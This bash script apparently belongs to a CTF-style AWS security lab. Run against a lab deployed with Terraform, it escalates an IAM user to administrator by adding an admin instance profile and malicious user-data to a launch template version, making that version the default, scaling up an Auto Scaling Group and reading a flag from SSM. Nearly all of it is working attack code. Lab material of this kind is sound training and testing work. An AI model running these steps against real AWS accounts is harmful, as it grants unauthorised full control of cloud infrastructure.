#!/bin/bash

# Demo script for ec2:CreateLaunchTemplateVersion + ec2:ModifyLaunchTemplate privilege escalation
# This scenario demonstrates how a user with these permissions can modify an existing
# launch template to launch instances with an admin role, using malicious user data
# to grant admin access to the starting user.


# Disable AWS CLI paging
export AWS_PAGER=""

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Dim color for command display
DIM='\033[2m'
CYAN='\033[0;36m'

# Track attack commands for summary
ATTACK_COMMANDS=()

# Display a command before executing it
show_cmd() {
    local identity="$1"; shift
    echo -e "${DIM}[${identity}] \$ $*${NC}"
}

# Display AND record an attack command
show_attack_cmd() {
    local identity="$1"; shift
    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
    ATTACK_COMMANDS+=("$*")
}

# Configuration
STARTING_USER="pl-prod-ec2-005-to-admin-starting-user"
TARGET_ADMIN_ROLE="pl-prod-ec2-005-to-admin-target-role"
TARGET_ADMIN_PROFILE="pl-prod-ec2-005-to-admin-target-profile"
VICTIM_TEMPLATE_NAME="pl-prod-ec2-005-to-admin-victim-template"
VICTIM_ASG_NAME="pl-prod-ec2-005-to-admin-victim-asg"

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}Launch Template Modification Privilege Escalation Demo${NC}"
echo -e "${GREEN}========================================${NC}\n"

# Step 1: Retrieve credentials and region from Terraform grouped outputs
echo -e "${YELLOW}Step 1: Retrieving scenario configuration from Terraform${NC}"
cd ../../../../../..  # Navigate to root of terraform project

# Get the module output using the grouped output pattern
MODULE_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.single_account_privesc_one_hop_to_admin_ec2_005_ec2_createlaunchtemplateversion_ec2_modifylaunchtemplate.value // empty')

if [ -z "$MODULE_OUTPUT" ]; then
    echo -e "${RED}Error: Could not find terraform output${NC}"
    echo "Make sure you've deployed this scenario with: terraform apply"
    exit 1
fi

# Extract credentials from the grouped output
STARTING_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
STARTING_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')

if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; then
    echo -e "${RED}Error: Could not extract credentials from terraform output${NC}"
    exit 1
fi

# Extract readonly credentials for observation/polling steps
READONLY_ACCESS_KEY=$(terraform output -raw prod_readonly_user_access_key_id 2>/dev/null)
READONLY_SECRET_KEY=$(terraform output -raw prod_readonly_user_secret_access_key 2>/dev/null)

if [ -z "$READONLY_ACCESS_KEY" ] || [ "$READONLY_ACCESS_KEY" == "null" ]; then
    echo -e "${RED}Error: Could not find readonly credentials in terraform output${NC}"
    exit 1
fi

# Get region
AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")

if [ -z "$AWS_REGION" ]; then
    echo -e "${YELLOW}Warning: Could not retrieve region from Terraform, defaulting to us-east-1${NC}"
    AWS_REGION="us-east-1"
fi

echo "Retrieved access key for: $STARTING_USER"
echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
echo "ReadOnly Key ID: ${READONLY_ACCESS_KEY:0:10}..."
echo "Region: $AWS_REGION"
echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"

# Navigate back to scenario directory
cd - > /dev/null

# Credential switching helpers
use_starting_creds() {
    export AWS_ACCESS_KEY_ID="$STARTING_ACCESS_KEY_ID"
    export AWS_SECRET_ACCESS_KEY="$STARTING_SECRET_ACCESS_KEY"
    unset AWS_SESSION_TOKEN
}
use_readonly_creds() {
    export AWS_ACCESS_KEY_ID="$READONLY_ACCESS_KEY"
    export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
    unset AWS_SESSION_TOKEN
}

# Source demo permissions library for validation restriction
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
source "$SCRIPT_DIR/../../../../../../scripts/lib/demo_permissions.sh"

# Restrict helpful permissions during validation run
restrict_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
setup_demo_restriction_trap "$SCRIPT_DIR/scenario.yaml"

# [EXPLOIT] Step 2: Verify starting user identity
echo -e "${YELLOW}Step 2: Configuring AWS CLI with starting user credentials${NC}"
use_starting_creds
export AWS_REGION=$AWS_REGION

echo "Using region: $AWS_REGION"

# Verify starting user identity
show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $CURRENT_USER"

if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
    echo -e "${RED}Error: Not running as $STARTING_USER${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Verified starting user identity${NC}\n"

# [OBSERVATION] Step 3: Get account ID
echo -e "${YELLOW}Step 3: Getting account ID${NC}"
use_readonly_creds
show_cmd "ReadOnly" "aws sts get-caller-identity --query 'Account' --output text"
ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
echo "Account ID: $ACCOUNT_ID"
echo -e "${GREEN}✓ Retrieved account ID${NC}\n"

# [EXPLOIT] Step 4: Verify we don't have admin permissions yet
echo -e "${YELLOW}Step 4: Verifying we don't have admin permissions yet${NC}"
use_starting_creds
echo "Attempting to list IAM users (should fail)..."
show_cmd "Attacker" "aws iam list-users --max-items 1"
if aws iam list-users --max-items 1 &> /dev/null; then
    echo -e "${RED}⚠ Unexpectedly have admin permissions already${NC}"
else
    echo -e "${GREEN}✓ Confirmed: Cannot list IAM users (as expected)${NC}"
fi
echo ""

# [OBSERVATION] Step 5: Inspect the existing launch template
echo -e "${YELLOW}Step 5: Inspecting the victim launch template${NC}"
use_readonly_creds
echo "Target launch template: $VICTIM_TEMPLATE_NAME"
echo ""

show_cmd "ReadOnly" "aws ec2 describe-launch-templates --region "$AWS_REGION" --launch-template-names "$VICTIM_TEMPLATE_NAME" --query 'LaunchTemplates[0]' --output json"
TEMPLATE_INFO=$(aws ec2 describe-launch-templates \
    --region $AWS_REGION \
    --launch-template-names $VICTIM_TEMPLATE_NAME \
    --query 'LaunchTemplates[0]' \
    --output json)

TEMPLATE_ID=$(echo "$TEMPLATE_INFO" | jq -r '.LaunchTemplateId')
ORIGINAL_DEFAULT_VERSION=$(echo "$TEMPLATE_INFO" | jq -r '.DefaultVersionNumber')

echo "Launch Template ID: $TEMPLATE_ID"
echo "Current Default Version: $ORIGINAL_DEFAULT_VERSION"

# Get current version details
show_cmd "ReadOnly" "aws ec2 describe-launch-template-versions --region "$AWS_REGION" --launch-template-id "$TEMPLATE_ID" --versions '\$Default' --query 'LaunchTemplateVersions[0].LaunchTemplateData' --output json"
CURRENT_VERSION_INFO=$(aws ec2 describe-launch-template-versions \
    --region $AWS_REGION \
    --launch-template-id $TEMPLATE_ID \
    --versions '$Default' \
    --query 'LaunchTemplateVersions[0].LaunchTemplateData' \
    --output json)

CURRENT_PROFILE=$(echo "$CURRENT_VERSION_INFO" | jq -r '.IamInstanceProfile.Arn // .IamInstanceProfile.Name // "none"')
echo "Current Instance Profile: $CURRENT_PROFILE"
echo -e "${GREEN}✓ Retrieved launch template information${NC}\n"

# Step 6: Prepare malicious user-data script
echo -e "${YELLOW}Step 6: Preparing malicious user-data script${NC}"
echo "This script will attach AdministratorAccess policy to the starting user"

# Create user-data script
USER_DATA=$(cat <<EOF
#!/bin/bash
exec > >(tee /var/log/user-data.log|logger -t user-data -s 2>/dev/console) 2>&1
echo "Starting privilege escalation script..."

STARTING_USER_NAME="${STARTING_USER}"

# Wait for IAM role to be available
sleep 15

# Attach AdministratorAccess policy to the starting user
aws iam attach-user-policy \
  --user-name \$STARTING_USER_NAME \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

echo "AdministratorAccess attached to \$STARTING_USER_NAME successfully"
EOF
)

# Base64 encode user-data for safe passing
USER_DATA_B64=$(echo "$USER_DATA" | base64 | tr -d '\n')

echo -e "${GREEN}✓ Malicious user-data script prepared${NC}\n"

# [EXPLOIT] Step 7: Create new launch template version with admin role and malicious user data
echo -e "${YELLOW}Step 7: Creating new launch template version with admin role${NC}"
use_starting_creds  # switch back to attacker for the exploit steps
echo "This is the privilege escalation vector - using CreateLaunchTemplateVersion..."
echo "Instance profile: $TARGET_ADMIN_PROFILE"
echo ""

# Get the AMI ID from the current version
CURRENT_AMI=$(echo "$CURRENT_VERSION_INFO" | jq -r '.ImageId')
CURRENT_INSTANCE_TYPE=$(echo "$CURRENT_VERSION_INFO" | jq -r '.InstanceType')

# Create new version with admin profile and malicious user data
show_attack_cmd "Attacker" "aws ec2 create-launch-template-version --region "$AWS_REGION" --launch-template-id "$TEMPLATE_ID" --source-version "$ORIGINAL_DEFAULT_VERSION" --launch-template-data "{\"ImageId\": \"$CURRENT_AMI\", \"InstanceType\": \"$CURRENT_INSTANCE_TYPE\", \"IamInstanceProfile\": {\"Name\": \"$TARGET_ADMIN_PROFILE\"}, \"UserData\": \"$USER_DATA_B64\", \"InstanceMarketOptions\": {\"MarketType\": \"spot\", \"SpotOptions\": {\"MaxPrice\": \"0.02\", \"SpotInstanceType\": \"one-time\"}}}" --output json"
NEW_VERSION_OUTPUT=$(aws ec2 create-launch-template-version \
    --region $AWS_REGION \
    --launch-template-id $TEMPLATE_ID \
    --source-version $ORIGINAL_DEFAULT_VERSION \
    --launch-template-data "{
        \"ImageId\": \"$CURRENT_AMI\",
        \"InstanceType\": \"$CURRENT_INSTANCE_TYPE\",
        \"IamInstanceProfile\": {
            \"Name\": \"$TARGET_ADMIN_PROFILE\"
        },
        \"UserData\": \"$USER_DATA_B64\",
        \"InstanceMarketOptions\": {
            \"MarketType\": \"spot\",
            \"SpotOptions\": {
                \"MaxPrice\": \"0.02\",
                \"SpotInstanceType\": \"one-time\"
            }
        }
    }" \
    --output json)

NEW_VERSION_NUMBER=$(echo "$NEW_VERSION_OUTPUT" | jq -r '.LaunchTemplateVersion.VersionNumber')

if [ -z "$NEW_VERSION_NUMBER" ] || [ "$NEW_VERSION_NUMBER" = "null" ]; then
    echo -e "${RED}Error: Failed to create new launch template version${NC}"
    exit 1
fi

echo "Created new launch template version: $NEW_VERSION_NUMBER"
echo -e "${GREEN}✓ New version created with admin role and malicious user data${NC}\n"

# [EXPLOIT] Step 8: Modify launch template to use the new version as default
echo -e "${YELLOW}Step 8: Modifying launch template to set new version as default${NC}"
use_starting_creds
echo "Using ec2:ModifyLaunchTemplate to update the default version..."
echo ""

show_attack_cmd "Attacker" "aws ec2 modify-launch-template --region "$AWS_REGION" --launch-template-id "$TEMPLATE_ID" --default-version "$NEW_VERSION_NUMBER" --output text"
aws ec2 modify-launch-template \
    --region $AWS_REGION \
    --launch-template-id $TEMPLATE_ID \
    --default-version $NEW_VERSION_NUMBER \
    --output text > /dev/null

echo "Updated default version from $ORIGINAL_DEFAULT_VERSION to $NEW_VERSION_NUMBER"
echo -e "${GREEN}✓ Launch template default version modified${NC}\n"

# [EXPLOIT] Step 9: Trigger instance launch via Auto Scaling Group
echo -e "${YELLOW}Step 9: Triggering instance launch via Auto Scaling Group${NC}"
use_starting_creds
echo "Setting ASG desired capacity to 1 to trigger instance launch..."
echo ""

show_attack_cmd "Attacker" "aws autoscaling set-desired-capacity --region $AWS_REGION --auto-scaling-group-name $VICTIM_ASG_NAME --desired-capacity 1 --output text"
aws autoscaling set-desired-capacity \
    --region $AWS_REGION \
    --auto-scaling-group-name $VICTIM_ASG_NAME \
    --desired-capacity 1 \
    --output text > /dev/null

echo -e "${GREEN}✓ Auto Scaling Group capacity updated${NC}\n"

# [OBSERVATION] Step 10: Wait for instance to launch
echo -e "${YELLOW}Step 10: Waiting for instance to launch${NC}"
use_readonly_creds
echo "This may take 1-2 minutes..."
echo ""

MAX_WAIT=180  # 3 minutes
WAIT_TIME=0
INSTANCE_ID=""

while [ $WAIT_TIME -lt $MAX_WAIT ]; do
    # Find instances launched by the ASG
    ASG_INSTANCES=$(aws autoscaling describe-auto-scaling-groups \
        --region $AWS_REGION \
        --auto-scaling-group-names $VICTIM_ASG_NAME \
        --query 'AutoScalingGroups[0].Instances[?LifecycleState==`InService` || LifecycleState==`Pending`]' \
        --output json 2>/dev/null || echo "[]")

    INSTANCE_COUNT=$(echo "$ASG_INSTANCES" | jq 'length')

    if [ "$INSTANCE_COUNT" -gt 0 ]; then
        INSTANCE_ID=$(echo "$ASG_INSTANCES" | jq -r '.[0].InstanceId')
        show_cmd "ReadOnly" "aws ec2 describe-instances --region "$AWS_REGION" --instance-ids "$INSTANCE_ID" --query 'Reservations[0].Instances[0].State.Name' --output text"
        INSTANCE_STATE=$(aws ec2 describe-instances \
            --region $AWS_REGION \
            --instance-ids $INSTANCE_ID \
            --query 'Reservations[0].Instances[0].State.Name' \
            --output text 2>/dev/null || echo "unknown")

        if [ "$INSTANCE_STATE" = "running" ]; then
            echo -e "\n${GREEN}✓ Instance launched and running: $INSTANCE_ID${NC}\n"
            break
        fi
    fi

    echo -n "."
    sleep 10
    WAIT_TIME=$((WAIT_TIME + 10))
done

echo ""

if [ -z "$INSTANCE_ID" ] || [ "$INSTANCE_ID" = "null" ]; then
    echo -e "${RED}Error: Instance did not launch within timeout${NC}"
    echo "ASG Name: $VICTIM_ASG_NAME"
    exit 1
fi

# [OBSERVATION] Step 11: Wait for user-data script to attach AdministratorAccess
echo -e "${YELLOW}Step 11: Waiting for user-data script to attach AdministratorAccess${NC}"
use_readonly_creds
echo "This may take 2-3 minutes while the instance executes the malicious script..."
echo ""

MAX_WAIT=300  # 5 minutes
WAIT_TIME=0
POLICY_ATTACHED=false

while [ $WAIT_TIME -lt $MAX_WAIT ]; do
    # Check if AdministratorAccess is attached to the starting user
    ATTACHED_POLICIES=$(aws iam list-attached-user-policies --user-name $STARTING_USER --query 'AttachedPolicies[?PolicyName==`AdministratorAccess`].PolicyName' --output text 2>/dev/null || echo "")

    if [ "$ATTACHED_POLICIES" == "AdministratorAccess" ]; then
        echo -e "${GREEN}✓ Policy attachment complete! AdministratorAccess attached to starting user${NC}\n"
        POLICY_ATTACHED=true
        break
    fi

    echo -n "."
    sleep 10
    WAIT_TIME=$((WAIT_TIME + 10))
done

echo ""

if [ "$POLICY_ATTACHED" = false ]; then
    echo -e "${RED}Error: Policy attachment did not complete within timeout${NC}"
    echo "Instance ID: $INSTANCE_ID"
    echo "Launch Template: $TEMPLATE_ID (version $NEW_VERSION_NUMBER)"
    echo "You may need to check the instance logs or increase the timeout"
    exit 1
fi

# [EXPLOIT] Step 12: Verify administrator access with starting user credentials
echo -e "${YELLOW}Step 12: Verifying administrator access${NC}"
echo "Waiting 15 seconds for IAM policy propagation..."
sleep 15
use_starting_creds
echo "The starting user now has AdministratorAccess attached..."
echo "Attempting to list IAM users with starting user credentials..."

show_cmd "Attacker (now admin)" "aws iam list-users --max-items 3 --output table"
if aws iam list-users --max-items 3 --output table; then
    echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
    echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED${NC}"
else
    echo -e "${RED}✗ Failed to list users${NC}"
    exit 1
fi
echo ""

# [EXPLOIT] Step 13: Capture the CTF flag
# The starting user now has AdministratorAccess attached, which grants ssm:GetParameter
# implicitly. Use those credentials to read the scenario flag from SSM Parameter Store.
use_starting_creds
echo -e "${YELLOW}Step 13: Capturing CTF flag from SSM Parameter Store${NC}"
FLAG_PARAM_NAME="/pathfinding-labs/flags/ec2-005-to-admin"
show_attack_cmd "Attacker (now admin)" "aws ssm get-parameter --name $FLAG_PARAM_NAME --query 'Parameter.Value' --output text"
FLAG_VALUE=$(aws ssm get-parameter --region "$AWS_REGION" --name "$FLAG_PARAM_NAME" --query 'Parameter.Value' --output text 2>/dev/null)

if [ -n "$FLAG_VALUE" ] && [ "$FLAG_VALUE" != "None" ]; then
    echo -e "${GREEN}✓ Flag captured: ${FLAG_VALUE}${NC}"
else
    echo -e "${RED}✗ Failed to read flag from $FLAG_PARAM_NAME${NC}"
    exit 1
fi
echo ""

# Restore helpful permissions for manual exploration
restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"

# Final summary
echo -e "\n${GREEN}========================================${NC}"
echo -e "${GREEN}✅ CTF FLAG CAPTURED!${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "\n${YELLOW}Attack Summary:${NC}"
echo "1. Started as: $STARTING_USER (with CreateLaunchTemplateVersion, ModifyLaunchTemplate)"
echo "2. Created new launch template version with admin role ($TARGET_ADMIN_PROFILE) and malicious user data"
echo "3. Modified launch template to use new version as default (version $NEW_VERSION_NUMBER)"
echo "4. Auto Scaling Group launched instance with the modified template"
echo "5. Instance user data attached AdministratorAccess policy to starting user"
echo "6. Achieved: Full administrator access"
echo "7. Captured CTF flag from SSM Parameter Store: $FLAG_VALUE"

echo -e "\n${YELLOW}Attack Path:${NC}"
echo "  $STARTING_USER → CreateLaunchTemplateVersion (admin role + malicious user data)"
echo "  → ModifyLaunchTemplate (set default version) → Instance Launch"
echo "  → User Data Execution → AttachUserPolicy AdministratorAccess → Admin Access"
echo "  → ssm:GetParameter → CTF Flag"

if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
    echo -e "\n${YELLOW}Attack Commands:${NC}"
    for cmd in "${ATTACK_COMMANDS[@]}"; do
        echo -e "  ${CYAN}\$ ${cmd}${NC}"
    done
fi

echo -e "\n${YELLOW}Attack Artifacts:${NC}"
echo "- Modified launch template: $TEMPLATE_ID"
echo "- New malicious version: $NEW_VERSION_NUMBER"
echo "- Original default version: $ORIGINAL_DEFAULT_VERSION"
echo "- New default version: $NEW_VERSION_NUMBER"
echo "- Launched instance: $INSTANCE_ID"
echo "- AdministratorAccess policy attached to: $STARTING_USER"

echo -e "\n${RED}⚠ Warning: AdministratorAccess policy has been attached to the starting user${NC}"
echo -e "${RED}⚠ The launch template has been modified (new default version)${NC}"
echo -e "${RED}⚠ An instance is running and incurring charges${NC}"
echo ""
echo -e "${YELLOW}To clean up and restore the original state:${NC}"
echo "  ./cleanup_attack.sh or use the plabs TUI/CLI"
echo ""

# Mark demo as active for plabs tracking
touch "$(dirname "$0")/.demo_active"
